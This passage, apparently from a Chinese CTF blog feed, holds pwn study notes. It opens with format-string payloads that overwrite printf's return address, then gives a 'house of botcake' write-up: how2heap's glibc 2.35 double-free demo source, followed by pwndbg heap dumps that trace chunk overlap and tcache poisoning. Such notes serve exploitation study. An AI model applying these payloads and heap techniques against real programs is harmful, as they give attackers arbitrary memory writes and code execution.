class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&#x27;%p&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.format(printf_ret - <span class="number">90</span>).encode() + b<span class="string">&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.format(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + b<span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>这样可以一次性改成，而</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.format(printf_ret).encode() + b<span class="string">&quot;%11$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.format(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + b<span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>这样却不行的情况了<br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> fmtstr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of botcake</title>
      <link href="/2025/09/07/%E5%85%B3%E4%BA%8Ehouse-of-botcake/"/>
      <url>/2025/09/07/%E5%85%B3%E4%BA%8Ehouse-of-botcake/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在<code>tcache_key</code>的引入后，<code>tcache poisoning</code>的利用不再那么方便，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p><ol><li>破坏掉被 free 的堆块中的 key，绕过检查（常用）</li><li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries</li><li><strong>House of botcake</strong>（常用）</li></ol><p>以下就以<code>how2heap</code>的源码（<code>glibc2.35</code>）来调试分析一下<code>house of botcake</code>这个手法</p><h2 id="0x01-house-of-botcake-原理"><a href="#0x01-house-of-botcake-原理" class="headerlink" title="0x01 house of botcake 原理"></a>0x01 house of botcake 原理</h2><p>调试用的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating a chunk for later consolidation: prev @ %p\n&quot;</span>, prev);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk: a @ %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we have the chunk overlapping primitive:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This primitive will allow directly reading/writing objects, heap metadata, etc.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Below will use the chunk overlapping primitive to perform a tcache poisoning attack.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get the overlapping chunk from the unsorted bin.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x100</span> + <span class="number">0x100</span> + <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Use the overlapping chunk to control victim-&gt;next pointer.&quot;</span>);</span><br><span class="line">    <span class="comment">// mangle the pointer since glibc 2.32</span></span><br><span class="line">    unsorted[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = ((<span class="type">long</span>)a &gt;&gt; <span class="number">12</span>) ^ (<span class="type">long</span>)stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get back victim chunk from tcache. This will put target to tcache top.&quot;</span>);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim @ %p, size: %#x, end @ %p\n&quot;</span>, a, a_size, (<span class="type">void</span> *)a+a_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get the target chunk from tcache.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *target = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    target[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target @ %p == stack_var @ %p\n&quot;</span>, target, stack_var);</span><br><span class="line">    assert(stack_var[<span class="number">0</span>] == <span class="number">0xcafebabe</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先申请七个填充用的<code>chunk</code>，一个<code>prev chunk</code>，一个<code>victim chunk</code>，一个隔离用<code>chunk</code>，防止被<code>topchunk</code>合并。然后<code>free</code>掉七个<code>chunk</code>，再<code>free</code>掉<code>victim chunk</code>，我们查看此时的堆布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x555555559</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555593a0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c7f9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594b0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c6e9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555595c0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c199</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596d0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c089</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555597e0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c3b9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555598f0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c2a9</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559a00</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x7ffff7e1ace0</span><br><span class="line">bk: 0x7ffff7e1ace0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555559c20</span><br><span class="line">Size: 0x20 (with flag bits: 0x20)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559c40</span><br><span class="line">Size: 0x203c0 (with flag bits: 0x203c1)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559900 —▸ 0x5555555597f0 —▸ 0x5555555596e0 —▸ 0x5555555595d0 —▸ 0x5555555594c0 —▸ 0x5555555593b0 —▸ 0x5555555592a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559b10 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x555555559b10</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到我们的<code>victim chunk</code>位于<code>unsorted bin</code>这时候再<code>free</code>掉<code>prev chunk</code>，这时就会触发<code>unsortedbin consolidate</code>，<code>prev chunk</code>和<code>victim chunk</code>合并成了一个<code>chunk</code>，我们看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559a00</span><br><span class="line">Size: 0x220 (with flag bits: 0x221)</span><br><span class="line">fd: 0x7ffff7e1ace0</span><br><span class="line">bk: 0x7ffff7e1ace0</span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559a00 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x555555559a00</span><br></pre></td></tr></table></figure><p>但注意这时候被合并的<code>victim chunk</code>的数据并没有被更改，仍然保留</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x555555559a00</span><br><span class="line">0x555555559a00: 0x0000000000000000      0x0000000000000221</span><br><span class="line">0x555555559a10: 0x00007ffff7e1ace0      0x00007ffff7e1ace0</span><br><span class="line">0x555555559a20: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a30: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a50: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a60: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a70: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a80: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a90: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559aa0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ab0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ac0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ad0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ae0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559b00: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555559b20: 0x00007ffff7e1ace0      0x00007ffff7e1ace0</span><br><span class="line">0x555555559b30: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到<code>victim chunk</code>的数据仍然保留着，这时候我们<code>malloc(0x100)</code>从<code>tcache bin</code>取一个，腾出一个位置，再<code>free(victim chunk)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x555555559</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555593a0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c7f9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594b0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c6e9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555595c0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c199</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596d0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c089</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555597e0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line">fd: 0x55500000c3b9</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555598f0</span><br><span class="line">Size: 0x110 (with flag bits: 0x111)</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559a00</span><br><span class="line">Size: 0x220 (with flag bits: 0x221)</span><br><span class="line">fd: 0x7ffff7e1ace0</span><br><span class="line">bk: 0x7ffff7e1ace0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555559c20</span><br><span class="line">Size: 0x20 (with flag bits: 0x20)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559c40</span><br><span class="line">Size: 0x203c0 (with flag bits: 0x203c1)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559b20 —▸ 0x5555555597f0 —▸ 0x5555555596e0 —▸ 0x5555555595d0 —▸ 0x5555555594c0 —▸ 0x5555555593b0 —▸ 0x5555555592a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559a00 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x555555559a00</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>此时<code>victim chunk</code>进入<code>tcache bin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x555555559a00</span><br><span class="line">0x555555559a00: 0x0000000000000000      0x0000000000000221</span><br><span class="line">0x555555559a10: 0x00007ffff7e1ace0      0x00007ffff7e1ace0</span><br><span class="line">0x555555559a20: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a30: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a50: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a60: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a70: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a80: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559a90: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559aa0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ab0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ac0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ad0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559ae0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559b00: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555559b20: 0x000055500000c2a9      0xf2a4e651170222b6</span><br><span class="line">0x555555559b30: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>此时状态就是一个大的<code>unsorted chunk</code>吞着一个小的<code>tcache chunk</code>，这时候我们<code>malloc(0x210)</code>，也就是申请出这个大的合并的<code>unsorted chunk</code>，编辑到这个小的<code>tcache chunk</code>的数据，就能完成<code>tcache poisoning</code><br>并且这时候<code>tcache_perthread_struct</code>中<code>counts</code>记录的这个<code>tcache bin</code>的数量是足够的（因为我们准备工作中<code>free</code>了7个<code>chunk</code>），<code>tcache poisoning</code>一次后又可以<code>free</code> 掉 合并的<code>unsorted chunk</code>和<code>victim chunk</code>进行多次<code>tcache poisoning</code></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>感觉这个攻击手法的特点在于实现了<code>chunk overlapping</code>，然而其条件需要<code>use-after-free</code>也就是<code>free</code>后未清指针并且能编辑堆块，这个条件下，我们完全可以破坏<code>key</code>字段直接实现<code>double free</code>，但是如果是没有单独的编辑堆块功能，只能在申请的同时编辑的时候，<code>house of botcake</code>也就派上用场了</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> tcache attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在heap中进行ROP</title>
      <link href="/2025/09/03/%E5%9C%A8heap%E4%B8%AD%E8%BF%9B%E8%A1%8CROP/"/>
      <url>/2025/09/03/%E5%9C%A8heap%E4%B8%AD%E8%BF%9B%E8%A1%8CROP/</url>
      
